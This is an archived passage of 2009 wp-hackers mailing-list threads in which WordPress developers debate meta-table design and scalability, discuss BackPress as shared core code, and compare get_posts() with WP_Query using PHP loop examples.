> On Tue, Dec 22, 2009 at 2:42 PM, Malaiac <malaiac at gmail.com> wrote:
>> See, you are focused on portability and one time performance of...
> 
> Almost forgot, the "ALTER" is not a one time thing. If you use enums,
> then every time you add a new meta type, your table gets altered.
> ENUM's are enumerated, meaning that they're pre-defined. You can't add
> new ones on the fly, which is sorta the whole point behind meta.

I think you are viewing "one time" too literally.  Clearly the frequency with which ENUMs would need to be modified are at least two orders magnitude less than the number of times a query is called to load a set of posts, wouldn't you agree?

> That was what he was talking about. Use of ENUMs is a major
> performance drain for most sites (you know, the ones which aren't
> using 30 metas on each post and 20k comments on every page).

Now to be clear, I don't think anyone is arguing that meta_key should be an ENUM (or are they?) but instead for use of an ENUM to enumerate post types in a single meta table. The number of times you'd need to add a new post type would be small indeed.

> On Tue, Dec 22, 2009 at 2:42 PM, Malaiac <malaiac at gmail.com> wrote:
>> See, you are focused on portability and one time performance of an
>> ALTER table. I'm focused on long term performance of heavily used meta
>> tables. No way I'm gonna suffer a VARCHAR search for each and every
>> meta. There are sites with more than 20 000 comments on a single page.
>> There are sites with more than 30 meta values per post. ...
> 
> And those sites are not the norm, and so should be using customized
> solutions to solve their specific needs.

The problem with that argument is that most sites with 20,000 comments per post started as a brand new WordPress blog.  In an ideal world you are correct, but in the real world those types of site evolve to be from what you call "the norm."

> If a site has 30 meta values per post and is using them extensively,
> then they are doing it wrong.

"Doing it wrong?"  LOLcats, right? :-)

> They should be using some form of plugin
> with a custom table to handle their needs.

That's a really good point to discuss; *should* plugins be creating custom tables that are unaccessible to any other plugins that don't have pre-knowledge of that plugin, or would it be better to have a shared architecture of tables for those needs?  I'd argue that's where the custom table architecture I proposed makes uber-sense.

Personally plugins that create custom tables are (one of) the bane(s) of my WordPress existence.

> If a site has 20000 comments on a single page, then they are doing it
> wrong. They should be using some kind of forum software, or perhaps
> "paging" of their comments.

"Doing it wrong" again?  Think of how many got to the point of having 20,000 comments.  By starting a site that eventually grew to be popular.  

BTW, I interpreted "one a single page" to mean associated with a single "wp_posts" record, not how it was displayed.

> WordPress should not be developing core code to fill the needs of the
> tip of the long tail.

That's (another) place where we disagree.  It should not handle it in its default state but should IMO be architected to be able to scale to that level when someone reaches success without them having to hire a programming team to implement scalability on a per site basis just to support their successful personal site.  

BTW, did you see the request on wp-pro today for someone to help? Here is part of her request for help (note the traffic of 10k-13k pages and 70% of a 8 gig shared server):

Moderately busy Blog has run successfully for 2 years, Originally installed via Fantastico, Accessible via CPanel11, MyPhpAdmin, MSQL 5 (17 gig database), PHP Ver 5.29 Version.  The blog is crippled right now but on a nomal day I get about 10,000 - 13,000 page hits per day, 4000-6000 unique visitors,  Host claims I'm using up to 70% of a 8 gig shared server.  They also report that each process they allow is currently using about 80 mb of memory.  Currently on version 2.7.1 with no desire to move to current version yet.  Running 10 plugins including WP-Super Cache.

Doesn't sounds like that much traffic and this woman didn't sound like she ever expected to get to that point.  Hmm?

-Mike
P.S. BTW Otto, you going to come down from Tennessee to WordCamp Atlanta Jan 8-10?  Would love to finally meet face-to-face.

From mikeschinkel at newclarity.net  Wed Dec 23 04:33:59 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 22 Dec 2009 23:33:59 -0500
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <B61D492C-DBE1-4874-8D59-077AFB837A8C@ftwr.co.uk>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
	<003601ca824a$abb1fdc0$0315f940$@com>
	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
	<161617690912211249n24902ba6g581e3c1657296762@mail.gmail.com>
	<DFFC683A-C938-413B-8105-68440275F948@newclarity.net>
	<B61D492C-DBE1-4874-8D59-077AFB837A8C@ftwr.co.uk>
Message-ID: <BB14CE98-B36D-4887-938A-2F6A644CBA3B@newclarity.net>

On Dec 22, 2009, at 9:20 AM, Peter Westwood wrote:
> BackPress.org has more info.
> 
> The activity on BackPress has been decreasing partly because there isn't much that needs changing in it and partly because very few people know it exists.
> 
> There was a huge spike of activity at the beining of the projects life when all the code from WordPress was imported - the shared code hasn't changed that much since then so it is unlikely to have increasing activity by its very nature.
> 
> I am trying to keep the code in BackPress that is also in WordPress in sync so that one benifits to the fixes from the others.

So it is a fork of WordPress then?  That is worrisome because "code syncing" projects often get abandoned.  If it were a new foundation for future WordPress, that would spur more interest (in me.)

> I know that every tool has its trade offs but it seems to me from a lot of what you have commented on about your issues with WordPress as a CMS you want to do things in such a radically different way that some of the higher level bits of WordPress get in the way some of the time.

By saying "radically different" you are using words to tarnish my needs, probably inadvertently, but still.  Propaganda is all about using words to sway the audience to your perspective and by saying what I need is "radically different" you are biasing others subconsciously to fight what I'm asking for.

WordPress is sooooo close to what I need.  It just needs to be able to handle custom post types and special case URLs. That's really not a big architecture change, it's a small optional layer which, btw, I'm working on with my upcoming Post Type Voodoo plugin.

> BackPress gives you a framework to build your site from which doesn't preclude you using WordPress as well and using all those plugins and themes - it really comes down to what you are trying to build

Unfortunately, it's currently too obscure for me to write code depending on it.  If tens of thousands of devs start using it and it starts getting hundreds of plugins of its own, I'll be all over it.

> 
>>> If you have any BackPress questions then please let me know off list and I can point you in the right direction.
>> 
>> Thanks for the offer.  I'd be interested if it were something a lot of people were using and actively writing about.  If I am somehow misunderstanding its role then I would be very interested in learning more about it.
> 
> I know there isn't much being written about it.  A big part of that is that you don't necessarily know you are using it.  Everytime you use WordPress you are effectively using BackPress as it is a subset of the WordPress code.

Effectively and Actually are unfortunately too very different things.

There is much being written about CakePHP; for (people like me) to use BackPress there needs to be similar activity.  The easiest way for that to happen is to get WordPress to be based on BackPress, not have BackPress be a fork.

> There are currently two public projects using BackPress and a number of private/not yet public projects
> 
> I hope that helps answer some of your questions.

Very much, thanks.

-Mike

From mikeschinkel at newclarity.net  Wed Dec 23 04:37:50 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 22 Dec 2009 23:37:50 -0500
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <BB14CE98-B36D-4887-938A-2F6A644CBA3B@newclarity.net>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
	<003601ca824a$abb1fdc0$0315f940$@com>
	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
	<161617690912211249n24902ba6g581e3c1657296762@mail.gmail.com>
	<DFFC683A-C938-413B-8105-68440275F948@newclarity.net>
	<B61D492C-DBE1-4874-8D59-077AFB837A8C@ftwr.co.uk>
	<BB14CE98-B36D-4887-938A-2F6A644CBA3B@newclarity.net>
Message-ID: <91F8A9F8-ACC0-4896-8AFF-3DC00669B21D@newclarity.net>

On Dec 22, 2009, at 11:33 PM, Mike Schinkel wrote:
> Unfortunately, it's currently too obscure for me to write code depending on it.  If tens of thousands of devs start using it and it starts getting hundreds of plugins of its own, I'll be all over it.

Sorry, I meant that to be "tens of thousands of *end users* (not devs.)

-Mike

From wordpress at dd32.id.au  Wed Dec 23 04:44:09 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Wed, 23 Dec 2009 15:44:09 +1100
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <BB14CE98-B36D-4887-938A-2F6A644CBA3B@newclarity.net>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
	<003601ca824a$abb1fdc0$0315f940$@com>
	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
	<161617690912211249n24902ba6g581e3c1657296762@mail.gmail.com>
	<DFFC683A-C938-413B-8105-68440275F948@newclarity.net>
	<B61D492C-DBE1-4874-8D59-077AFB837A8C@ftwr.co.uk>
	<BB14CE98-B36D-4887-938A-2F6A644CBA3B@newclarity.net>
Message-ID: <op.u5djfvrnspxmuu@dd32>

On Wed, 23 Dec 2009 15:33:59 +1100, Mike Schinkel  
<mikeschinkel at newclarity.net> wrote:

> On Dec 22, 2009, at 9:20 AM, Peter Westwood wrote:
>> BackPress.org has more info.
>>
>> The activity on BackPress has been decreasing partly because there  
>> isn't much that needs changing in it and partly because very few people  
>> know it exists.
>>
>> There was a huge spike of activity at the beining of the projects life  
>> when all the code from WordPress was imported - the shared code hasn't  
>> changed that much since then so it is unlikely to have increasing  
>> activity by its very nature.
>>
>> I am trying to keep the code in BackPress that is also in WordPress in  
>> sync so that one benifits to the fixes from the others.
>
> So it is a fork of WordPress then?  That is worrisome because "code  
> syncing" projects often get abandoned.  If it were a new foundation for  
> future WordPress, that would spur more interest (in me.)

In a way you could look at it as a Fork of some core libs, Alternativly,  
You could look at it as a Repository of common code which is useable by  
all the *Press applications.

Ideally, WordPress wouldnt include these files itself, rather, They'd be  
part of Backpress only and included much like is done with the other  
applications. Originally that was planned, but theres always been more  
important things to get done than rip out the heart of WordPress and  
stitch in an Exact replica..

I personally see WP 3.0 as a good time to finally do that, Due to the  
changes that are probably going to be made during the WPMU Merge..
-- 
Using Opera's revolutionary e-mail client: http://www.opera.com/mail/

From mikeschinkel at newclarity.net  Wed Dec 23 05:48:49 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 23 Dec 2009 00:48:49 -0500
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <op.u5djfvrnspxmuu@dd32>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
	<003601ca824a$abb1fdc0$0315f940$@com>
	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
	<161617690912211249n24902ba6g581e3c1657296762@mail.gmail.com>
	<DFFC683A-C938-413B-8105-68440275F948@newclarity.net>
	<B61D492C-DBE1-4874-8D59-077AFB837A8C@ftwr.co.uk>
	<BB14CE98-B36D-4887-938A-2F6A644CBA3B@newclarity.net>
	<op.u5djfvrnspxmuu@dd32>
Message-ID: <DB3C858E-0C90-420E-BB2D-BD16DDD432D3@newclarity.net>

On Dec 22, 2009, at 11:44 PM, Dion Hulse (dd32) wrote:
> In a way you could look at it as a Fork of some core libs, Alternativly, You could look at it as a Repository of common code which is useable by all the *Press applications.
> 
> Ideally, WordPress wouldnt include these files itself, rather, They'd be part of Backpress only and included much like is done with the other applications. 

THAT would be ideal.  

> Originally that was planned, but theres always been more important things to get done than rip out the heart of WordPress and stitch in an Exact replica..

Alas.

> I personally see WP 3.0 as a good time to finally do that, Due to the changes that are probably going to be made during the WPMU Merge..

I'm getting more interested... :)

Question to you and others: Do you think 3.0 will have a longer gestation period than these point changes, or do you expect it to show up soon?

-Mike



From wordpress at dd32.id.au  Wed Dec 23 06:06:55 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Wed, 23 Dec 2009 17:06:55 +1100
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <DB3C858E-0C90-420E-BB2D-BD16DDD432D3@newclarity.net>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
	<003601ca824a$abb1fdc0$0315f940$@com>
	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
	<161617690912211249n24902ba6g581e3c1657296762@mail.gmail.com>
	<DFFC683A-C938-413B-8105-68440275F948@newclarity.net>
	<B61D492C-DBE1-4874-8D59-077AFB837A8C@ftwr.co.uk>
	<BB14CE98-B36D-4887-938A-2F6A644CBA3B@newclarity.net>
	<op.u5djfvrnspxmuu@dd32>
	<DB3C858E-0C90-420E-BB2D-BD16DDD432D3@newclarity.net>
Message-ID: <op.u5dm9tpuspxmuu@dd32>

On Wed, 23 Dec 2009 16:48:49 +1100, Mike Schinkel  
<mikeschinkel at newclarity.net> wrote:
> Question to you and others: Do you think 3.0 will have a longer  
> gestation period than these point changes, or do you expect it to show  
> up soon?

WordPress treats versions in decimal format, 2.9 is followed by 2.9,  
followed by 3.0, There is no special meaning to the x incrementing in x.y

Its likely to be the same period as has been seen between 2.7 to 2.8 and  
2.8 to 2.9.

Expect to see 3.0 around March 2010 unless a longer period is required to  
get it stable after new features. http://wordpress.org/about/roadmap/
-- 
Using Opera's revolutionary e-mail client: http://www.opera.com/mail/

From mikeschinkel at newclarity.net  Wed Dec 23 06:29:34 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 23 Dec 2009 01:29:34 -0500
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <op.u5dm9tpuspxmuu@dd32>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
	<003601ca824a$abb1fdc0$0315f940$@com>
	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
	<161617690912211249n24902ba6g581e3c1657296762@mail.gmail.com>
	<DFFC683A-C938-413B-8105-68440275F948@newclarity.net>
	<B61D492C-DBE1-4874-8D59-077AFB837A8C@ftwr.co.uk>
	<BB14CE98-B36D-4887-938A-2F6A644CBA3B@newclarity.net>
	<op.u5djfvrnspxmuu@dd32>
	<DB3C858E-0C90-420E-BB2D-BD16DDD432D3@newclarity.net>
	<op.u5dm9tpuspxmuu@dd32>
Message-ID: <8AF136E9-E081-41F7-9AC2-F7C87E8DFB76@newclarity.net>

> WordPress treats versions in decimal format, 2.9 is followed by 2.9, followed by 3.0, There is no special meaning to the x incrementing in x.y

Thanks. 

-Mike

On Dec 23, 2009, at 1:06 AM, Dion Hulse (dd32) wrote:

> On Wed, 23 Dec 2009 16:48:49 +1100, Mike Schinkel <mikeschinkel at newclarity.net> wrote:
>> Question to you and others: Do you think 3.0 will have a longer gestation period than these point changes, or do you expect it to show up soon?
> 
> WordPress treats versions in decimal format, 2.9 is followed by 2.9, followed by 3.0, There is no special meaning to the x incrementing in x.y
> 
> Its likely to be the same period as has been seen between 2.7 to 2.8 and 2.8 to 2.9.
> 
> Expect to see 3.0 around March 2010 unless a longer period is required to get it stable after new features. http://wordpress.org/about/roadmap/
> -- 
> Using Opera's revolutionary e-mail client: http://www.opera.com/mail/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From mikeschinkel at newclarity.net  Wed Dec 23 07:08:10 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 23 Dec 2009 02:08:10 -0500
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <BB14CE98-B36D-4887-938A-2F6A644CBA3B@newclarity.net>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
	<003601ca824a$abb1fdc0$0315f940$@com>
	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
	<161617690912211249n24902ba6g581e3c1657296762@mail.gmail.com>
	<DFFC683A-C938-413B-8105-68440275F948@newclarity.net>
	<B61D492C-DBE1-4874-8D59-077AFB837A8C@ftwr.co.uk>
	<BB14CE98-B36D-4887-938A-2F6A644CBA3B@newclarity.net>
Message-ID: <1124FA17-2C7A-4F2D-A56D-A3E4D4755B2C@newclarity.net>

On Dec 22, 2009, at 9:20 AM, Peter Westwood wrote:
> BackPress.org has more info.
> 
> The activity on BackPress has been decreasing partly because there isn't much that needs changing in it and partly because very few people know it exists.
> 
> There was a huge spike of activity at the beining of the projects life when all the code from WordPress was imported - the shared code hasn't changed that much since then so it is unlikely to have increasing activity by its very nature.
> 
> I am trying to keep the code in BackPress that is also in WordPress in sync so that one benifits to the fixes from the others.


So you peaked my technical curiosity and I started reading the website but there doesn't seem to be anything that tells one how to get started with a sample app.  IOW, there's no "Hello World" example.  Also, I couldn't find anything on URL routing.

Any chance you could write a blog post on the topics?

-Mike

From peter.westwood at ftwr.co.uk  Wed Dec 23 07:17:52 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Wed, 23 Dec 2009 07:17:52 +0000
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <1124FA17-2C7A-4F2D-A56D-A3E4D4755B2C@newclarity.net>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
	<003601ca824a$abb1fdc0$0315f940$@com>
	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
	<161617690912211249n24902ba6g581e3c1657296762@mail.gmail.com>
	<DFFC683A-C938-413B-8105-68440275F948@newclarity.net>
	<B61D492C-DBE1-4874-8D59-077AFB837A8C@ftwr.co.uk>
	<BB14CE98-B36D-4887-938A-2F6A644CBA3B@newclarity.net>
	<1124FA17-2C7A-4F2D-A56D-A3E4D4755B2C@newclarity.net>
Message-ID: <B36B8927-3FE1-427F-AA1B-ECC45ECD3852@ftwr.co.uk>


On 23 Dec 2009, at 07:08, Mike Schinkel wrote:

> On Dec 22, 2009, at 9:20 AM, Peter Westwood wrote:
>> BackPress.org has more info.
>>
>> The activity on BackPress has been decreasing partly because there  
>> isn't much that needs changing in it and partly because very few  
>> people know it exists.
>>
>> There was a huge spike of activity at the beining of the projects  
>> life when all the code from WordPress was imported - the shared  
>> code hasn't changed that much since then so it is unlikely to have  
>> increasing activity by its very nature.
>>
>> I am trying to keep the code in BackPress that is also in WordPress  
>> in sync so that one benifits to the fixes from the others.
>
>
> So you peaked my technical curiosity and I started reading the  
> website but there doesn't seem to be anything that tells one how to  
> get started with a sample app.  IOW, there's no "Hello World"  
> example.  Also, I couldn't find anything on URL routing.
>

The best place to start for an example of use at the moment is  
probably GlotPress as that was built using BackPress from the ground up.

BackPress itself doesn't have a basic url router at present and I  
suspect different projects are doing things in different ways.

GlotPress has one implemented here - http://trac.glotpress.org/browser/trunk/gp-includes/routes.php

I am in the process of implementing a different one for another  
project which I hope to get an early alpha of out soon.

I think in the long run it would be good to have a basic url router  
included in BackPress or maybe even a couple of different ones for  
people to pick and choose from hopefully this is something that will  
come from more people using it.

> Any chance you could write a blog post on the topics?
>

Once I have some code to share I will definitely write some stuff up

-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From mikeschinkel at newclarity.net  Wed Dec 23 07:37:28 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 23 Dec 2009 02:37:28 -0500
Subject: [wp-hackers] Wordpress as a CMS
In-Reply-To: <B36B8927-3FE1-427F-AA1B-ECC45ECD3852@ftwr.co.uk>
References: <f44b36190912200945h6c061541s64d946fb685dace1@mail.gmail.com>
	<003601ca824a$abb1fdc0$0315f940$@com>
	<F4FE28F7-5202-4A4D-A2A0-C6C5FACB3289@newclarity.net>
	<161617690912211249n24902ba6g581e3c1657296762@mail.gmail.com>
	<DFFC683A-C938-413B-8105-68440275F948@newclarity.net>
	<B61D492C-DBE1-4874-8D59-077AFB837A8C@ftwr.co.uk>
	<BB14CE98-B36D-4887-938A-2F6A644CBA3B@newclarity.net>
	<1124FA17-2C7A-4F2D-A56D-A3E4D4755B2C@newclarity.net>
	<B36B8927-3FE1-427F-AA1B-ECC45ECD3852@ftwr.co.uk>
Message-ID: <EB574A08-2DD8-46AA-8ED9-1EB8B0110F64@newclarity.net>

On Dec 23, 2009, at 2:17 AM, Peter Westwood wrote:
> The best place to start for an example of use at the moment is probably GlotPress as that was built using BackPress from the ground up.
> 
> BackPress itself doesn't have a basic url router at present and I suspect different projects are doing things in different ways.
> 
> GlotPress has one implemented here - http://trac.glotpress.org/browser/trunk/gp-includes/routes.php
> 
> I am in the process of implementing a different one for another project which I hope to get an early alpha of out soon.
> 
> I think in the long run it would be good to have a basic url router included in BackPress or maybe even a couple of different ones for people to pick and choose from hopefully this is something that will come from more people using it.
> 
>> Any chance you could write a blog post on the topics?
>> 
> 
> Once I have some code to share I will definitely write some stuff up
> 

Thanks.  How about a separate mailing list for discussing BackPress since discussions would be noise for most people on the list?

-Mike


From malaiac at gmail.com  Wed Dec 23 07:44:35 2009
From: malaiac at gmail.com (Malaiac)
Date: Wed, 23 Dec 2009 08:44:35 +0100
Subject: [wp-hackers] Metadata Mess
In-Reply-To: <AC6467C4-6871-41B9-99DF-BC4560495CD0@newclarity.net>
References: <4B30AC3E.8030803@santosj.name>
	<59e7f3130912220341w7ff0da20tbff09b6d170bc084@mail.gmail.com>
	<bbd639f50912220849t39070ec2gaa9e0663889e48d1@mail.gmail.com>
	<59e7f3130912221242k34ac8b9cx2560f0c7963cd9c7@mail.gmail.com>
	<161617690912221308q5ff37e55vccb06aa5b97f72b2@mail.gmail.com>
	<AC6467C4-6871-41B9-99DF-BC4560495CD0@newclarity.net>
Message-ID: <59e7f3130912222344j26c9621ek3a3fd82c9c7947a9@mail.gmail.com>

2009/12/23 Mike Schinkel <mikeschinkel at newclarity.net>:
> I think you are viewing "one time" too literally. ?Clearly the frequency with which ENUMs would need to be modified are at least two orders magnitude less than the number of times a query is called to load a set of posts, wouldn't you agree?

thx for clearing that up. I was thinking of one or two ALTER in the
life of the website versus thousands of SELECT on a VARCHAR.

>> And those sites are not the norm, and so should be using customized
>> solutions to solve their specific needs.

ok, what CMS should be used to manage a small (by number of pages)
website with user management, post and page management, plugins,
themes, and.... oh, did you say WordPress ? :)


>> If a site has 20000 comments on a single page, then they are doing it
>> wrong. They should be using some kind of forum software, or perhaps
>> "paging" of their comments.
>
> "Doing it wrong" again? ?Think of how many got to the point of having 20,000 comments. ?By starting a site that eventually grew to be popular.
>
> BTW, I interpreted "one a single page" to mean associated with a single "wp_posts" record, not how it was displayed.

Yes, it's paged, 50 comments per page. The page is one game, which
draw a large audience and many comments (think TPB torrent page with
comments, etc)


> Moderately busy Blog has run successfully for 2 years, Originally installed via Fantastico, Accessible via CPanel11, MyPhpAdmin, MSQL 5 (17 gig database), PHP Ver 5.29 Version. ?The blog is crippled right now but on a nomal day I get about 10,000 - 13,000 page hits per day, 4000-6000 unique visitors, ?Host claims I'm using up to 70% of a 8 gig shared server. ?They also report that each process they allow is currently using about 80 mb of memory. ?Currently on version 2.7.1 with no desire to move to current version yet. ?Running 10 plugins including WP-Super Cache.
>
> Doesn't sounds like that much traffic and this woman didn't sound like she ever expected to get to that point. ?Hmm?

Fitting the specific need of this website is not the goal of WP.
However, allowing this website to run properly on WP, with some tweaks
(but no core mod) with an average hosting (a big shared pack or a VPS)
seems reasonable, doesn't it ?

M

From scribu at gmail.com  Wed Dec 23 13:44:41 2009
From: scribu at gmail.com (scribu)
Date: Wed, 23 Dec 2009 15:44:41 +0200
Subject: [wp-hackers] Metadata Mess
In-Reply-To: <4B316C89.2080100@santosj.name>
References: <4B30AC3E.8030803@santosj.name>
	<59e7f3130912220341w7ff0da20tbff09b6d170bc084@mail.gmail.com>
	<bbd639f50912220849t39070ec2gaa9e0663889e48d1@mail.gmail.com>
	<59e7f3130912221242k34ac8b9cx2560f0c7963cd9c7@mail.gmail.com>
	<bbd639f50912221355r27202a2gbf7bb29d283674f5@mail.gmail.com>
	<4B316C89.2080100@santosj.name>
Message-ID: <349fe48b0912230544p3c555206r5083261478261dce@mail.gmail.com>

On Wed, Dec 23, 2009 at 3:04 AM, Jacob Santos <wordpress at santosj.name>wrote:

> If you are fine with it scribu, I hope to use your patch with a project I'm
> going to be doing in a few weeks. Hopefully, with the extra real world usage
> of the API a few problems that people have will be resolved. I'll  probably
> be experimenting as well.
>

Sure, go right ahead.


-- 
http://scribu.net

From jayarjo at gmail.com  Wed Dec 23 16:10:25 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Wed, 23 Dec 2009 20:10:25 +0400
Subject: [wp-hackers] new WP_Query vs. get_posts() - any difference?
Message-ID: <9aa12a490912230810t72502e4cib47d93adc34206e7@mail.gmail.com>

When I need custom loop with wp tag support I usually do:

<?php if ($posts = get_posts("cat=4,7")): ?>
 <ul>
    <?php foreach ($posts as $post) : setup_postdata($post); ?>
        <li>
           <h1><a href="<?php the_permalink() ?>" rel="bookmark"
title="Permanent Link to <?php the_title_attribute(); ?>"><?php the_title();
?></a></h1>
        </li>
    <?php endforeach; ?>
  </ul>
 <?php endif; ?>

But sometimes I see a different approach:

<?php $query = new WP_Query("cat=4,7");
if ($query->have_posts()) : $query->the_post(); ?>
  <ul>
     <?php while ($query->have_posts()) : the_post(); ?>
      <li>
           <h1><a href="<?php the_permalink() ?>" rel="bookmark"
title="Permanent Link to <?php the_title_attribute(); ?>"><?php the_title();
?></a></h1>
      </li>
 <?php endwhile; ?>
 </ul>
<?php endif; ?>

and codex uses it to for demonstration of  how the custom loop should be
called. First approach is obviously cleaner, but maybe it has unobvious
drawbacks?

-- 
Davit Barbakadze

From austin at ilfilosofo.com  Wed Dec 23 16:27:12 2009
From: austin at ilfilosofo.com (Austin Matzko)
Date: Wed, 23 Dec 2009 10:27:12 -0600
Subject: [wp-hackers] new WP_Query vs. get_posts() - any difference?
In-Reply-To: <9aa12a490912230810t72502e4cib47d93adc34206e7@mail.gmail.com>
References: <9aa12a490912230810t72502e4cib47d93adc34206e7@mail.gmail.com>
Message-ID: <674b4a3b0912230827p4f5af712l323ae760e51f60ff@mail.gmail.com>

On Wed, Dec 23, 2009 at 10:10 AM, Davit Barbakadze <jayarjo at gmail.com> wrote:
> When I need custom loop with wp tag support I usually do:
>
> <?php if ($posts = get_posts("cat=4,7")): ?>

[snip]

> But sometimes I see a different approach:
>
> <?php $query = new WP_Query("cat=4,7");

[snip]

> and codex uses it to for demonstration of ?how the custom loop should be
> called. First approach is obviously cleaner, but maybe it has unobvious
> drawbacks?

Most of the time those two approaches will have the same result.
However, you should keep in mind that get_posts() by default sets its
"suppress_filters" argument to true, so if a plugin tries to customize
results via the WP_Query filters, it will be able to change the
results in your second, WP_Query example but not the first,
get_posts() example.  Since most themes use WP_Query or query_posts,
most plugin authors have a reasonable expectation that they'll be able
to use the WP_Query filters to affect theme output, and any themes you
make with default get_posts() will defy those expectations.

Also, since get_posts() instantiates WP_Query() itself, the second
route is more direct.

From jayarjo at gmail.com  Wed Dec 23 18:06:51 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Wed, 23 Dec 2009 22:06:51 +0400
Subject: [wp-hackers] new WP_Query vs. get_posts() - any difference?
In-Reply-To: <674b4a3b0912230827p4f5af712l323ae760e51f60ff@mail.gmail.com>
References: <9aa12a490912230810t72502e4cib47d93adc34206e7@mail.gmail.com>
	<674b4a3b0912230827p4f5af712l323ae760e51f60ff@mail.gmail.com>
Message-ID: <9aa12a490912231006w6ac6a438k2a0c0fc8207e10bd@mail.gmail.com>

So if I just add suppress_filters=0 into get_posts() it will make
those two approaches identical?

Thank you for explanation!

On Wed, Dec 23, 2009 at 8:27 PM, Austin Matzko <austin at ilfilosofo.com> wrote:
>
> On Wed, Dec 23, 2009 at 10:10 AM, Davit Barbakadze <jayarjo at gmail.com> wrote:
> > When I need custom loop with wp tag support I usually do:
> >
> > <?php if ($posts = get_posts("cat=4,7")): ?>
>
> [snip]
>
> > But sometimes I see a different approach:
> >
> > <?php $query = new WP_Query("cat=4,7");
>
> [snip]
>
> > and codex uses it to for demonstration of ?how the custom loop should be
> > called. First approach is obviously cleaner, but maybe it has unobvious
> > drawbacks?
>
> Most of the time those two approaches will have the same result.
> However, you should keep in mind that get_posts() by default sets its
> "suppress_filters" argument to true, so if a plugin tries to customize
> results via the WP_Query filters, it will be able to change the
> results in your second, WP_Query example but not the first,
> get_posts() example. ?Since most themes use WP_Query or query_posts,
> most plugin authors have a reasonable expectation that they'll be able
> to use the WP_Query filters to affect theme output, and any themes you
> make with default get_posts() will defy those expectations.
>
> Also, since get_posts() instantiates WP_Query() itself, the second
> route is more direct.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers



--
Davit Barbakadze

From austin at ilfilosofo.com  Wed Dec 23 18:14:46 2009
From: austin at ilfilosofo.com (Austin Matzko)
Date: Wed, 23 Dec 2009 12:14:46 -0600
Subject: [wp-hackers] new WP_Query vs. get_posts() - any difference?
In-Reply-To: <9aa12a490912231006w6ac6a438k2a0c0fc8207e10bd@mail.gmail.com>
References: <9aa12a490912230810t72502e4cib47d93adc34206e7@mail.gmail.com>
	<674b4a3b0912230827p4f5af712l323ae760e51f60ff@mail.gmail.com>
	<9aa12a490912231006w6ac6a438k2a0c0fc8207e10bd@mail.gmail.com>
Message-ID: <674b4a3b0912231014g53e1497eq809c8fb3e2f23483@mail.gmail.com>

On Wed, Dec 23, 2009 at 12:06 PM, Davit Barbakadze <jayarjo at gmail.com> wrote:
> So if I just add suppress_filters=0 into get_posts() it will make
> those two approaches identical?

More or less.  Also sticky posts won't work with get_posts().

From ravi-lists at g8o.net  Wed Dec 23 18:43:04 2009
From: ravi-lists at g8o.net (Ravi Narayan Sarma)
Date: Wed, 23 Dec 2009 13:43:04 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <349fe48b0912221456r6cfba522g91ed36953640e9a@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<90F94996-130F-4CA3-A9FB-21C00D0017E9@g8o.net>
	<349fe48b0912221456r6cfba522g91ed36953640e9a@mail.gmail.com>
Message-ID: <16B940ED-CDFA-431B-8CA9-8A5E119E5835@g8o.net>

On Dec 22, 2009, at 5:56 PM, scribu wrote:
> On Wed, Dec 23, 2009 at 12:37 AM, [ ravi ] <ravi-lists at g8o.net> wrote:
> 
>> There are some things that just take time if I want to do them the right
>> way... like right now, I am trying to figure out how some of the Comment
>> Administration actions seem to respond AJAXily (e.g: approve/unapprove) and
>> I am not at all sure how that's done. I want to add some additional comment
>> actions (which act via AJAX) and I can code all that up quickly if I just
>> implemented the AJAX query/response for those actions (using jQuery perhaps,
>> with clues from the corresponding Codex page). But perhaps I am overworking?
>> Outside of asking on wp-hackers, is there a document that will tell me? (so
>> far, I don't know the answer after looking at some of the AJAX and admin
>> plugins related Codex pages).
>> 
> 
> No, there isn't a tutorial that will tell you how the AJAXy action links for
